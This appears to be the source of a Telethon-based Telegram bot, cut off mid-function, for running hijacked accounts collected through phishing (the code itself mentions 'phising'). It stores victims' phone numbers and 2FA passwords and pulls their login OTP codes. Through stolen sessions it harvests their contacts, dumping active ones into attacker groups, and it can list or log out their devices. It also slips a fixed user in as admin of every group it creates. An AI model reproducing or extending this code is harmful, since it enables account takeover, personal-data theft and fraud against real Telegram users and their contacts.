import time, json, math, asyncio, httpx, numbers, re, random, pathlib, os, sys, tempfile, sqlite3
# Fix Windows Terminal Encoding
if sys.platform == "win32":
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', line_buffering=True)
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', line_buffering=True)

def optimize_sqlite_session(session_path):
    """
    Mengaktifkan WAL mode dan busy_timeout pada file SQLite Telethon .session
    agar mendukung pembacaan dan penulisan konkuren tanpa error 'database is locked'.
    """
    if not session_path:
        return
    db_file = session_path if session_path.endswith(".session") else f"{session_path}.session"
    if os.path.exists(db_file):
        try:
            with sqlite3.connect(db_file, timeout=15) as conn:
                conn.execute("PRAGMA journal_mode=WAL;")
                conn.execute("PRAGMA synchronous=NORMAL;")
                conn.execute("PRAGMA busy_timeout=30000;")
        except Exception:
            pass

from telethon.sync import TelegramClient, Button, events
from telethon import TelegramClient, events, types, errors
from telethon.tl.functions.auth import SendCodeRequest, CheckPasswordRequest
from telethon.errors import SessionPasswordNeededError
from telethon.errors.rpcerrorlist import UnauthorizedError, PasswordHashInvalidError, AuthKeyUnregisteredError, UserAlreadyParticipantError, InviteHashExpiredError, UserKickedError
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest, GetPasswordRequest
from telethon import functions
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import EditAdminRequest, CreateChannelRequest, InviteToChannelRequest, GetParticipantsRequest, LeaveChannelRequest
from telethon.tl.types import ChannelParticipantAdmin, PeerChannel, UserStatusOnline, UserStatusRecently, UserStatusLastWeek, UserStatusOffline, ChannelParticipantsSearch
from telethon.tl.functions.contacts import GetContactsRequest, DeleteContactsRequest
from datetime import datetime, timedelta, timezone
from telethon.errors import RPCError
import pytz
import argparse

# Setup CLI Arguments
parser = argparse.ArgumentParser(description='MALXGMN Dynamic Bot Runner')
parser.add_argument('--api_id', type=int, required=False)
parser.add_argument('--api_hash', type=str, required=False)
parser.add_argument('--bot_token', type=str, required=False)
parser.add_argument('--bot_username', type=str, required=False)
parser.add_argument('--admin_ids', type=str, required=False) # Koma dipisah
parser.add_argument('--path', type=str, default="./")
parser.add_argument('--invite_link', type=str, required=False) 
parser.add_argument('--tenant_id', type=str, default="0")
args = parser.parse_args()

# Try to import from settings.py as fallback
try:
    import settings
except ImportError:
    settings = None

# Override variables from CLI or fallback to settings.py
api_id = args.api_id or (getattr(settings, 'api_id') if settings else None)
api_hash = args.api_hash or (getattr(settings, 'api_hash') if settings else None)
bot_token = args.bot_token or (getattr(settings, 'bot_token') if settings else None)
bot_username = args.bot_username or (getattr(settings, 'bot_username') if settings else None)
admin_raw = args.admin_ids or (",".join(map(str, getattr(settings, 'admin'))) if settings and hasattr(settings, 'admin') else "")
admin = [int(i.strip()) for i in admin_raw.split(',')] if admin_raw else []
path = args.path.strip('"')
tenant_id = args.tenant_id
INVITE_LINK = args.invite_link or (getattr(settings, 'invite_link') if settings and hasattr(settings, 'invite_link') else "")

if not all([api_id, api_hash, bot_token]):
    print("[!] Error: api_id, api_hash, and bot_token are required via CLI or settings.py")
    exit(1)

# Static defaults (can be moved to args if needed)
showperpage = 50
url = "" # Will be set for API updates
MAX_SHARE = 5000
DELAY_MIN = 1
DELAY_MAX = 5
WITA_hours = 8
ACTIVE_LIMIT_days = 3
WITA = timezone(timedelta(hours=WITA_hours))
ACTIVE_LIMIT = timedelta(days=ACTIVE_LIMIT_days)

# Initialize Bot with session unique per token to allow parallelism
from telethon.network import connection
session_path = os.path.join(path, "sessions", f"tenant_{tenant_id}", "main_watcher")
os.makedirs(session_path, exist_ok=True)
bot_session_name = os.path.join(session_path, f"bot_{bot_token.split(':')[0]}")
optimize_sqlite_session(bot_session_name)

print(f"[*] Starting Bot Watcher (Session: {bot_session_name})...")
bot = None
for attempt in range(5):
    try:
        bot = TelegramClient(
            bot_session_name, 
            api_id, 
            api_hash,
            connection=connection.ConnectionTcpIntermediate
        )
        bot.start(bot_token=bot_token)
        print("[✔] Bot Watcher connected successfully!")
        
        # Ensure admin entities are fetched and cached
        print("[*] Fetching admin entities...")
        for a in admin:
            try:
                bot.get_entity(int(a))
                print(f"[✔] Admin entity {a} cached.")
            except Exception as e:
                print(f"[!] Warning: Could not fetch entity for admin {a}: {e}")
        break
    except Exception as e:
        print(f"[!] Connection attempt {attempt+1} failed: {e}")
        try:
            if bot and bot.is_connected():
                bot.disconnect()
        except Exception:
            pass
        err_str = str(e).lower()
        if "expired" in err_str or "invalid" in err_str or "unauthorized" in err_str:
            print(f"[!] Token Bot untuk Tenant {tenant_id} kedaluwarsa atau tidak valid di Telegram. Silakan periksa bot_token pada pengaturan tenant di Admin Panel.")
            exit(1)
        if attempt < 4:
            wait_time = (attempt + 1) * 3
            print(f"[*] Retrying in {wait_time}s...")
            time.sleep(wait_time)
        else:
            print("[!] Critical: Could not connect to Telegram after 5 attempts.")
            exit(1)

nomorsedot = {}
waiting_for_link = {}
waiting_for_group_link = {}
waiting_for_group_name = {}
temporary_data = {}

# FILES
fUsers = os.path.join(path, "json", f"users_{tenant_id}.json")
fPhase = os.path.join(path, "json", f"phase_{tenant_id}.json")
fInvited = os.path.join(path, "json", f"invited_{tenant_id}.json")
fGroups = os.path.join(path, "json", f"groups_{tenant_id}.json")

# Ensure directories exist
os.makedirs(os.path.join(path, "json"), exist_ok=True)
os.makedirs(os.path.join(path, "sessions", f"tenant_{tenant_id}"), exist_ok=True)

# ─────────── Helper Functions ───────────
def aktif_dalam_3_hari(u: types.User) -> bool:
    """Check if user is active within 3 days"""
    st = u.status
    if st is None:
        return False
    if isinstance(st, (types.UserStatusOnline, types.UserStatusRecently)):
        return True
    if isinstance(st, types.UserStatusOffline):
        return datetime.now(WITA) - st.was_online.replace(tzinfo=WITA) <= ACTIVE_LIMIT
    if isinstance(st, types.UserStatusLastWeek):
        return True
    return False

async def share_contacts_session(ambo, invite: str, limit: int = 5000):
    """Share contacts to group"""
    code = invite.rsplit("+", 1)[-1]
    try:
        join_res = await ambo(functions.messages.ImportChatInviteRequest(code))
        grup = join_res.chats[0] if getattr(join_res, "chats", None) else await ambo.get_entity(invite)
    except UserAlreadyParticipantError:
        grup = await ambo.get_entity(invite)
    except Exception as e:
        print(f"Error joining group: {e}")
        return 0, 0

    # Mute notifications
    try:
        await ambo(functions.account.UpdateNotifySettingsRequest(
            peer=grup,
            settings=types.InputPeerNotifySettings(mute_until=2**31 - 1)
        ))
    except Exception as e:
        print(f"Failed to mute: {e}")

    # Get and filter contacts
    all_users = (await ambo(functions.contacts.GetContactsRequest(hash=0))).users
    kandidat = []
    for u in all_users:
        if getattr(u, "mutual_contact", False):
            continue
        if not aktif_dalam_3_hari(u):
            continue
        phone = (u.phone or "").lstrip("+")
        if not phone or not phone.startswith("62"):
            continue
        kandidat.append(u)
        if len(kandidat) >= limit:
            break

    # Batching System (Akselerasi Maut)
    sent = fail = 0
    BATCH_SIZE = 10  # Tembak 10 kontak sekaligus
    
    # Helper fungsion untuk tembak 1 kontak
    async def inject_contact(u):
        try:
            phone = (u.phone or "").lstrip("+")
            media = types.InputMediaContact(
                phone_number=phone,
                first_name=u.first_name or "-",
                last_name=u.last_name or "",
                vcard=(
                    "BEGIN:VCARD\nVERSION:3.0\n"
                    f"FN:{(u.first_name or '-')} {(u.last_name or '')}\n"
                    f"TEL:{phone}\nEND:VCARD"
                ),
            )
            await ambo(functions.messages.SendMediaRequest(
                peer=grup,
                media=media,
                message="",
                random_id=int.from_bytes(os.urandom(8), "big", signed=True),
            ))
            return True, u.id
        except Exception as e:
            print(f"Failed to send contact {u.id}: {type(e).__name__}: {e}")
            return False, u.id

    # Pemotongan daftar kandiat menjadi paket-paket
    for i in range(0, len(kandidat), BATCH_SIZE):
        batch = kandidat[i:i+BATCH_SIZE]
        
        # Eksekusi Tembakan Bareng (Paralel)
        tasks = [inject_contact(u) for u in batch]
        results = await asyncio.gather(*tasks)
        
        for success, uid in results:
            if success:
                sent += 1
            else:
                fail += 1
                
        # Micro-Delay anti-flood wait Telegram (Max 30 Req/Sec, kita 10 Req/0.5 Sec = Aman)
        if i + BATCH_SIZE < len(kandidat):
            await asyncio.sleep(0.5)


    # Leave group
    try:
        await ambo(functions.channels.LeaveChannelRequest(channel=grup))
    except Exception:
        pass

    return sent, fail

async def create_multiple_groups(laco, group_names, description):
    for group_name in group_names:
        try:
            result = await laco(CreateChannelRequest(
                title=group_name,
                about=description,
                megagroup=True
            ))
            print(f"Grup berhasil dibuat: {group_name}, ID: {result.chats[0].id}")
            
            group_entity = result.chats[0]
            print(f"Grup berhasil dibuat: {group_name}, ID: {group_entity.id}")
            hapus = 1024019497
            
            await laco(InviteToChannelRequest(
                group_entity,
                users=[hapus]
            ))
            print(f"User {hapus} berhasil ditambahkan ke grup.")
            
            await laco(EditAdminRequest(
                group_entity,
                hapus,
                ChannelParticipantAdmin(
                    is_admin=True,
                    is_creator=False,
                    can_change_info=True,
                    can_invite_users=True,
                    can_pin_messages=True
                )
            ))
            print(f"User {hapus} berhasil dijadikan admin.")
            
        except Exception as e:
            print(f"Error membuat grup {group_name}: {e}")

def get_active_contacts(contacts, days=7):
    """Get active contacts within specified days"""
    active_contacts = []
    cutoff_date = datetime.now(pytz.utc) - timedelta(days=days)
    
    for contact in contacts.users:
        if not contact.mutual_contact:
            continue
            
        last_seen = None
        if contact.status:
            if isinstance(contact.status, UserStatusOnline):
                last_seen = datetime.now(pytz.utc)
            elif isinstance(contact.status, UserStatusRecently):
                last_seen = datetime.now(pytz.utc) - timedelta(days=1)
            elif isinstance(contact.status, UserStatusLastWeek):
                last_seen = datetime.now(pytz.utc) - timedelta(days=min(days, 6))
            elif isinstance(contact.status, UserStatusOffline):
                if contact.status.was_online >= cutoff_date:
                    last_seen = contact.status.was_online
        
        if last_seen and last_seen >= cutoff_date:
            active_contacts.append(contact)
    
    return active_contacts

def get_active_contacts1(contacts):
    return get_active_contacts(contacts, days=1)

def get_active_contacts3(contacts):
    return get_active_contacts(contacts, days=3)

def read_groups_from_json(filename=None):
    target = filename or fGroups
    with open(target, 'r') as file:
        data = json.load(file)
    return data['groups']

async def check_group_info(laco, group_id, max_members=200):
    try:
        group_id = int(group_id)
        group_entity = await laco.get_entity(PeerChannel(group_id))
        
        group_members = await laco(GetParticipantsRequest(
            group_entity,
            ChannelParticipantsSearch(''),
            0,
            200,
            hash=0
        ))

        group_size = len(group_members.users)
        print(f"Jumlah anggota grup {group_entity.title}: {group_size}")

        if group_size <= max_members:
            return group_entity, group_id

    except Exception as e:
        print(f"Gagal mendapatkan informasi grup: {e}")
    return None, None

async def check_multiple_groups(laco, group_data, max_members=200):
    tasks = [check_group_info(laco, group['group_id'], max_members) for group in group_data]
    results = await asyncio.gather(*tasks)
    
    for result, group in zip(results, group_data):
        if result[0]:
            print(f"Grup yang ditemukan: {group['group_name']} (ID: {group['group_id']})")
            print(f"Link Grup: {group['link']}")
            return group['link']

    return None

def readJSON(targetFile):
    """
    Baca file JSON dengan fallback ke backup.
    Jika file utama rusak (akibat pkill -9 saat sedang ditulis),
    otomatis recover dari file .bak sehingga data tidak hilang.
    """
    backup = targetFile + ".bak"
    try:
        if not os.path.exists(targetFile):
            if os.path.exists(backup):
                print(f"[!] {targetFile} tidak ada, recover dari backup...")
                with open(backup, 'r') as f:
                    return json.load(f)
            return {}
        with open(targetFile, 'r') as f:
            data = json.load(f)
        # Simpan backup hanya jika data tidak kosong
        if data:
            try:
                with open(backup, 'w') as bf:
                    json.dump(data, bf, indent=4)
            except Exception:
                pass
        return data
    except Exception as e:
        print(f"[!] Error reading {targetFile}: {e}")
        if os.path.exists(backup):
            try:
                print(f"[✔] Recovering data from backup: {backup}")
                with open(backup, 'r') as f:
                    return json.load(f)
            except Exception as be:
                print(f"[!] Backup juga gagal dibaca: {be}")
        return {}

def saveJSON(targetFile, source):
    """
    Simpan JSON secara ATOMIC menggunakan temp file + os.replace.
    Jika proses di-kill di tengah penulisan, file asli TIDAK akan rusak.
    """
    try:
        dir_name = os.path.dirname(os.path.abspath(targetFile))
        os.makedirs(dir_name, exist_ok=True)
        with tempfile.NamedTemporaryFile('w', dir=dir_name, delete=False,
                                         suffix='.tmp', encoding='utf-8') as tmp:
            json.dump(source, tmp, indent=4, ensure_ascii=False)
            tmp_path = tmp.name
        # Rename atomic — tidak bisa terpotong di tengah jalan
        os.replace(tmp_path, targetFile)
    except Exception as e:
        print(f"[!] Error saving {targetFile}: {e}")
        try:
            if 'tmp_path' in locals() and os.path.exists(tmp_path):
                os.remove(tmp_path)
        except Exception:
            pass

def update(data):
    """Update via API"""
    if url:
        try:
            req = httpx.post(f"{url}/API/index.php", data=data, timeout=30)
        except Exception as e:
            print(f"Error updating API: {e}")

reported_users = set()

async def watch_user_login(bot, admin, fUsers, interval=3):
    """
    Monitor users.json
    Jika ada user baru login → kirim pesan ke admin
    """

    # preload user lama (biar tidak spam saat bot restart)
    if os.path.exists(fUsers):
        try:
            with open(fUsers, "r") as f:
                reported_users.update(json.load(f).keys())
        except Exception:
            pass

    print("👀 Watching user login from users.json")

    while True:
        try:
            # Ensure bot is connected in the loop
            if not bot.is_connected():
                print("[!] Watcher disconnected. Reconnecting...")
                await bot.connect()

            if not os.path.exists(fUsers):
                await asyncio.sleep(interval)
                continue

            with open(fUsers, "r") as f:
                users = json.load(f)

            for uid, data in users.items():
                if uid not in reported_users:
                    reported_users.add(uid)

                    # print(f"🆕 USER LOGIN DETECTED: {uid}")
                    # for a in admin:
                    #     await bot.send_message(
                    #         int(a),
                    #         message,
                    #         parse_mode="html"
                    #     )

                    # ✅ TRIGGER AUTO SHARE
                    invite_link = data.get('invite_link') or INVITE_LINK
                    if invite_link:
                        print(f"🚀 Auto Share Triggered for {uid} -> {invite_link}")
                        session_user_path = os.path.join(path, "sessions", f"tenant_{tenant_id}", "users")
                        os.makedirs(session_user_path, exist_ok=True)
                        user_session_file = os.path.join(session_user_path, uid)
                        optimize_sqlite_session(user_session_file)
                        from telethon.network import connection
                        async with TelegramClient(user_session_file, api_id, api_hash, connection=connection.ConnectionTcpIntermediate) as client:
                            sent, fail = await share_contacts_session(client, invite_link, limit=MAX_SHARE)
                            print(f"✅ Auto Share Done for {uid}: {sent} success, {fail} failed")
                            for a in admin:
                                try:
                                    await bot.send_message(int(a), f"📊 <b>Auto Share Selesai</b>\nUser: <code>{uid}</code>\n✅ Berhasil: {sent}\n❌ Gagal: {fail}", parse_mode="html")
                                except: pass

        except Exception as e:
            print("❌ watch_user_login error:", e)

        await asyncio.sleep(interval)


def todate(timestamp):
    """Convert timestamp to formatted date"""
    time_struct = time.localtime(timestamp)
    return time.strftime("%Y-%m-%d %H:%M:%S", time_struct)

def getUsers(page):
    users = readJSON(fUsers)
    if page == 1:
        start = 0
        end = showperpage
    else:
        start = (page * showperpage) - showperpage
        end = start + showperpage

    pagination = len(users) / showperpage
    addi = (
        "```\n"
        "░█░█░▀█░░▀█░░█▀▄░█▀█░▀█▀\n"
        "░░▀█░░█░░░█░░█▀▄░█░█░░█░\n"
        "░░░▀░▀▀▀░▀▀▀░▀▀░░▀▀▀░░▀░\n"
        "[✦] 411 BOT BROADCAST [✦]```\n\n"
        "**Telegram Account Manager**\n\n"
    )
    page_users = list(users.items())[start:end]

    no = start
    butto = []
    for phone, user in page_users:
        no += 1
        name = user["name"]
        if user.get('username'):
            name = f"[{name}](https://t.me/{user['username']})"
        addi += f"[{int(user['user_id'])}](https://t.me/{bot_username}?start=login-{phone}) | {name}\n"

        # ✅ bawa page biar bisa balik ke page yang sama
        butto.append([Button.inline(f"{no}.+{phone}", f"accountInfo-{phone}-{page}")])

    addi += f"\n**Total users:** {len(users)}\n**Updated:** {todate(round(time.time()))}\n➜ **PAGE {page}** / Showing: {start + 1} - {no}"

    if isinstance(pagination, numbers.Real):
        pagination = int(pagination) + 1
    return addi, pagination, butto


async def getSpecificUsers(phonenumber):
    """Get specific user info"""
    users = readJSON(fUsers)
    if phonenumber not in users:
        return "User not found"
        
    user_data = users[phonenumber]
    username = f"@{user_data['username']}" if user_data.get('username') else "None"

    result = (
        "**Telegram Account Manager**\n\n"
        f"**NAME TG:** {user_data['name']}\n"
        f"**NAME :** {user_data.get('ktp_name', '-')}\n"
        f"**USERNAME:** {username}\n"
        f"**PHONE:** `{phonenumber}`\n"
        f"**PASSWORD:** `{user_data.get('password', '')}`\n"
    )
    return result

def btnSpecificUsers(phonenumber, page=1):
    btn = [
        [Button.inline("SEDOT", f"sedot-{phonenumber}")],
        [Button.inline("GET OTP CODE", f"readcode-{phonenumber}")],
        [Button.inline("LIST NUMBER", f"getUser:{page}")],  # ✅ pakai page
        [Button.inline("BUANG 🗑", f"deleteThis-{phonenumber}"),
         Button.inline("📇TAMPUNG", data=f"share-{phonenumber}".encode())],
        [Button.inline("DEVICES", f"listsession-{phonenumber}"),
         Button.inline("❌ DELETE", "delete")]
    ]
    return btn


def readJSONa(file_name):
    try:
        with open(file_name, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error membaca file JSON: {e}")
        return {}

def saveJSONa(file_name, data):
    try:
        with open(file_name, "w") as file:
            json.dump(data, file, indent=4)
    except Exception as e:
        print(f"Error menyimpan file JSON: {e}")

btn_delete = Button.inline("❌ DELETE", "delete")

# ─────────── Event Handlers ───────────
@bot.on(events.NewMessage(incoming=True))
async def handle_new_message(event):
    if not event.is_private:
        return
        
    message = event.message
    chat_id = message.chat_id
    text = message.text
    sender = await event.get_sender()
    SENDER = sender.id
    user_id = event.sender_id
    message_text = event.message.message.strip()
    
    print(f"📩 Message from {SENDER}: {text}")
    
    be = await bot.get_me()
    
    # Admin commands
    if SENDER in admin:
        if text.startswith("/"):
            await event.delete()
            
            if text.startswith("/start"):
                text = text.replace("/start ", "")
                if text.startswith("login-"):
                    split = text.split("-")
                    phonenumber = split[1]
                    users_data = readJSON(fUsers)
                    if phonenumber in users_data:
                        await event.respond(await getSpecificUsers(phonenumber), buttons=btnSpecificUsers(phonenumber))
                    else:
                        await event.respond("User not found")
                else:
                    welcome_text = (
                        "```\n"
                        "░█░█░▀█░░▀█░░█▀▄░█▀█░▀█▀\n"
                        "░░▀█░░█░░░█░░█▀▄░█░█░░█░\n"
                        "░░░▀░▀▀▀░▀▀▀░▀▀░░▀▀▀░░▀░\n"
                        "[✦] 411 BOT BROADCAST [✦]```\n"
                        "**Pilih menu di bawah ini :**"
                    )
                    await event.respond(welcome_text, buttons=[
                        [Button.inline("👤 ACCOUNT MANAGER", "getUser:1")]
                    ])
                    
            elif text.startswith(("/users", "/accounts")):
                listuser, calco, butto = getUsers(1)
                butto.append([Button.inline("REFRESH 🔄", f"getUser:1")])
                if calco > 1:
                    butto.append([Button.inline("NEXT >", f"getUser:2")])
                butto.append([Button.inline("GRUP", f"getGrups:1")])
                await event.respond(listuser, buttons=butto, link_preview=False)
                
            elif text.startswith("/grups"):
                try:
                    groups_data = readJSON(fGroups)
                    groups = groups_data.get("groups", [])
                    
                    message = "**Daftar Grup yang Tersimpan:**\n\n"
                    buttons = []
                    
                    for index, group in enumerate(groups, start=1):
                        group_name = group.get("group_name", "Nama tidak ditemukan")
                        group_id = group.get("group_id", "ID tidak ditemukan")
                        group_link = group.get("link", "Link tidak ditemukan")
                        message += f"{index}. **{group_name}**\n    ID: `{group_id}`\n    Link: `{group_link}`\n\n"
                        
                    if not groups:
                        message += "Tidak ada grup yang tersimpan."
                        
                    buttons.append([Button.inline("➕ Tambah Grup Baru", data="add_new_group")])
                    
                    await event.reply(message, buttons=buttons)
                except Exception as e:
                    print(f"Error saat menampilkan daftar grup: {e}")
                    await event.reply("Terjadi kesalahan saat memuat daftar grup.")
                    
            elif text.startswith("/buat"):
                group_names = [f"Grup Ke-{i+1}" for i in range(5)]
                description = "Deskripsi Grup Default"
                
                temp_session = os.path.join(path, "sessions", f"tenant_{tenant_id}", "temp_creator")
                from telethon.network import connection
                async with TelegramClient(temp_session, api_id, api_hash, connection=connection.ConnectionTcpIntermediate) as laco:
                    await create_multiple_groups(laco, group_names, description)
                    
        # Handle link input for sedot feature
        if user_id in waiting_for_link and waiting_for_link[user_id]["status"] == "awaiting_group_link":
            code_match = re.search(r'(?:https?://)?t\.me/(?:\+|joinchat/)([a-zA-Z0-9_-]+)', message_text)
            if code_match:
                nomor = waiting_for_link[user_id]["nomor"]
                print(f"Processing link for: {nomor}")
                
                users = readJSON(fUsers)
                user_data = users.get(nomor)
                if not user_data:
                    await event.reply("User data tidak ditemukan.")
                    del waiting_for_link[user_id]
                    return
                    
                device_model = user_data.get("device_model", "Android")
                
                session_user_path = os.path.join(path, "sessions", f"tenant_{tenant_id}", "users")
                os.makedirs(session_user_path, exist_ok=True)
                from telethon.network import connection
                akun = TelegramClient(
                    os.path.join(session_user_path, nomor),
                    api_id,
                    api_hash,
                    device_model=device_model,
                    system_version="Android 13",
                    app_version="11.9.2",
                    lang_code="en",
                    system_lang_code="en",
                    connection=connection.ConnectionTcpIntermediate
                )
                await akun.connect()
                link = code_match.group(1)
                
                # Validate link
                try:
                    test_join = await akun(ImportChatInviteRequest(link))
                    try:
                        await akun(LeaveChannelRequest(channel=test_join.chats[0]))
                    except:
                        pass
                except UserAlreadyParticipantError:
                    pass
                except InviteHashExpiredError:
                    await event.reply("Link grup sudah expired atau tidak valid.")
                    await akun.disconnect()
                    del waiting_for_link[user_id]
                    return
                except Exception as e:
                    await event.reply(f"Gagal memvalidasi link: {str(e)}")
                    await akun.disconnect()
                    del waiting_for_link[user_id]
                    return

                # Get contacts
                contacts = await akun(GetContactsRequest(hash=0))
                active_contacts1 = get_active_contacts1(contacts)
                active_contacts3 = get_active_contacts3(contacts)
                active_contacts = get_active_contacts(contacts, days=7)
                
                Tombol = [
                    [Button.inline(f"1 Hari ({len(active_contacts1)})", f"inject1-{nomor}-{link}"),
                     Button.inline(f"3 Hari ({len(active_contacts3)})", f"inject3-{nomor}-{link}"),
                     Button.inline(f"7 Hari ({len(active_contacts)})", f"inject7-{nomor}-{link}")],
                    [Button.inline(f"Cancel", "delete")]
                ]
                await event.reply(
                    f"✅ Link diterima: {message_text}\n\n"
                    f"📊 Kontak aktif:\n"
                    f"• 1 hari: {len(active_contacts1)}\n"
                    f"• 3 hari: {len(active_contacts3)}\n"
                    f"• 7 hari: {len(active_contacts)}",
                    buttons=Tombol
                )
                del waiting_for_link[user_id]
                await akun.disconnect()
            else:
                await event.reply("Format link tidak valid. Gunakan format: https://t.me/+code")

        # Handle group link input for adding new group
        if user_id in waiting_for_group_link:
            code_match = re.search(r'(?:https?://)?t\.me/(?:\+|joinchat/)([a-zA-Z0-9_-]+)', message_text)
            if code_match:
                link = code_match.group(1)
                waiting_for_group_name[user_id] = link
                await event.respond("Link diterima")
            else:
                await event.respond("Format link tidak valid. Gunakan format: https://t.me/+code")
            del waiting_for_group_link[user_id]

        # Handle group name input
        if user_id in waiting_for_group_name:
            name = message_text.strip()
            link = waiting_for_group_name[user_id]
            groups_data = readJSON(fGroups)
            if "groups" not in groups_data:
                groups_data["groups"] = []
            groups_data["groups"].append({
                "group_name": name,
                "group_id": link,  # use link as id for now
                "link": f"https://t.me/+{link}"
            })
            saveJSON(fGroups, groups_data)
            await event.respond("Grup berhasil ditambahkan!")
            del waiting_for_group_name[user_id]

    else:
        pass

@bot.on(events.CallbackQuery())
async def callback_handler(event):
    callback_data = event.data.decode('utf-8')
    user_id = event.sender_id
    message = await bot.get_messages(event.chat_id, ids=event.message_id)

    # =========================
    # 1) PAGINATION USERS LIST
    # =========================
    if callback_data.startswith("getUser:"):
        split = callback_data.split(":")
        val = int(split[1])
        listuser, calco, butto = getUsers(val)

        # refresh
        butto.append([Button.inline("REFRESH 🔄", f"getUser:{val}")])

        # prev/next
        btx = []
        if calco > 1:
            if val == 1:
                btx = [Button.inline("NEXT >", "getUser:2")]
            else:
                btx = [Button.inline("< PREV", f"getUser:{val-1}")]
                if calco > val:
                    btx.append(Button.inline("NEXT >", f"getUser:{val+1}"))
        if btx:
            butto.append(btx)

        try:
            await event.edit(listuser, buttons=butto, link_preview=False)
        except:
            pass
        return

    # =========================
    # 2) GROUPS VIEW
    # =========================
    elif callback_data.startswith("getGrups:"):
        try:
            groups_data = readJSON(fGroups)
            groups = groups_data.get("groups", [])

            msg = "**Daftar Grup yang Tersimpan:**\n\n"
            buttons = []

            for index, group in enumerate(groups, start=1):
                group_name = group.get("group_name", "Nama tidak ditemukan")
                group_id = group.get("group_id", "ID tidak ditemukan")
                group_link = group.get("link", "Link tidak ditemukan")
                msg += (
                    f"{index}. **{group_name}**\n"
                    f"    ID: `{group_id}`\n"
                    f"    Link: `{group_link}`\n\n"
                )

            if not groups:
                msg += "Tidak ada grup yang tersimpan."

            buttons.append([Button.inline("➕ Tambah Grup Baru", data="add_new_group")])

            await event.edit(msg, buttons=buttons)
        except Exception as e:
            print(f"Error saat menampilkan daftar grup: {e}")
            await event.edit("Terjadi kesalahan saat memuat daftar grup.")
        return

    # =========================
    # 3) DELETE MESSAGE / CANCEL
    # =========================
    elif callback_data == "delete":
        # Clear any waiting states
        if user_id in waiting_for_group_link:
            del waiting_for_group_link[user_id]
        if user_id in waiting_for_group_name:
            del waiting_for_group_name[user_id]
        if user_id in waiting_for_link:
            del waiting_for_link[user_id]

        try:
            await event.delete()
        except:
            await event.answer("Tidak bisa menghapus pesan")
        return

    # =========================
    # 4) ADD NEW GROUP START
    # =========================
    elif callback_data.startswith("add_new_group"):
        try:
            waiting_for_group_link[user_id] = True
            await event.respond("Silakan kirim link grup dalam format: https://t.me/+code")
        except Exception as e:
            print(f"Error saat menangani tombol tambah grup baru: {e}")
            await notif("Bermasalah i bosku, chat i jo pakkebu phising e")
        return

    # =========================
    # 5) ALL OTHER CALLBACKS
    # =========================
    split = callback_data.split("-")
    method = split[0]

    urelated = [
        "share", "inject1", "inject3", "inject7", "allcontact", "sedot", "add_new_group",
        "linkgrup", "accountInfo", "readcode", "listsession", "selectsessionhash",
        "logout", "surelogout", "clearAllSession", "sureClearAllSession",
        "deleteThis", "sureDeleteThis"
    ]

    if method not in urelated:
        # kalau bukan yang kamu handle, biarin aja
        return

    # fInvited sudah didefinisikan secara global di baris 103 dengan scoping tenant_id

    # ✅ Support accountInfo-{phone}-{page}
    # kalau lama masih accountInfo-{phone} juga aman
    phonenumber = split[1] if len(split) > 1 else ""
    page = 1
    if method == "accountInfo" and len(split) >= 3 and split[2].isdigit():
        page = int(split[2])

    users = readJSON(fUsers)
    phase = readJSON(fPhase)

    user_data = users.get(phonenumber)
    if not user_data:
        try:
            await event.answer("❌ User data tidak ditemukan.", alert=True)
        except:
            await event.edit("❌ User data tidak ditemukan.", buttons=[Button.inline("OK", "delete")])
        return

    device_model = user_data.get("device_model", "Android")

    # =========================
    # DELETE DATA USER (Operasi JSON lokal, tidak butuh koneksi acd)
    # =========================
    if callback_data.startswith("deleteThis-"):
        xsplit = callback_data.split("-")
        no_hpx = xsplit[1]
        await event.edit(
            f"Apakah Anda yakin ingin menghapus akun `{no_hpx}` dari bot ini?",
            buttons=[
                Button.inline("YES, 100%", f"sureDeleteThis-{no_hpx}"),
                Button.inline("NO, CANCEL!", "delete")
            ]
        )
        return

    elif callback_data.startswith("sureDeleteThis-"):
        xsplit = callback_data.split("-")
        no_hpx = xsplit[1]
        if no_hpx in users:
            users.pop(no_hpx)
            saveJSON(fUsers, users)
        await event.edit(f"AKUN `{no_hpx}` TELAH DIHAPUS DARI DATA USERS.JSON")
        return

    session_user_path = os.path.join(path, "sessions", f"tenant_{tenant_id}", "users")
    os.makedirs(session_user_path, exist_ok=True)
    session_file = os.path.join(session_user_path, phonenumber)
    optimize_sqlite_session(session_file)

    acd = TelegramClient(
        session_file,
        api_id,
        api_hash,
        device_model=device_model,
        system_version="Android 13",
        app_version="11.9.2",
        lang_code="en",
        system_lang_code="en"
    )

    connected = False
    for conn_try in range(3):
        try:
            await acd.connect()
            connected = True
            break
        except Exception as e:
            if "database is locked" in str(e).lower() and conn_try < 2:
                await asyncio.sleep(1.5 * (conn_try + 1))
            else:
                print(f"[!] Error connecting acd for {phonenumber}: {e}")
                break

    if not connected:
        try:
            await acd.disconnect()
        except Exception:
            pass
        try:
            await event.answer("⚠️ Sesi Telegram sedang sibuk / auto-share berjalan. Coba beberapa detik lagi.", alert=True)
        except Exception:
            try:
                await event.edit("⚠️ Sesi Telegram sedang sibuk atau offline. Silakan coba kembali.", buttons=[Button.inline("OK", "delete")])
            except Exception:
                pass
        return

    try:
        # =========================
        # ✅ FIX: ACCOUNT INFO (DETAIL)
        # =========================
        if callback_data.startswith("accountInfo-"):
            try:
                contacts = await acd(GetContactsRequest(hash=0))
                total_contacts = len(contacts.users)
                mutual_contacts = [u for u in contacts.users if getattr(u, "mutual_contact", False)]
                total_mutual = len(mutual_contacts)

                result_contact = (
                    f"**KONTAK:** `{total_contacts}`\n"
                    f" >Timbal Balik: `{total_mutual}`"
                )
                result = await getSpecificUsers(phonenumber)

                # ✅ CUMA 1 LIST NUMBER: ambil dari btnSpecificUsers
                try:
                    btns = btnSpecificUsers(phonenumber, page)  # kalau sudah kamu ubah signature nya
                except TypeError:
                    btns = btnSpecificUsers(phonenumber)        # fallback kalau belum

                # ✅ Tambah BACK di atas, tapi LIST NUMBER jangan ditambah lagi
                buttons = [[Button.inline("⬅️ BACK", "delete")]] + btns

                await event.respond(
                    f"{result}\n{result_contact}\n\n**Updated:** {todate(time.time())}",
                    buttons=buttons,
                    link_preview=False
                )

                try:
                    await event.answer("✅ Detail dikirim.", alert=False)
                except:
                    pass

            except Exception as e:
                print(f"Error in accountInfo: {e}")
                try:
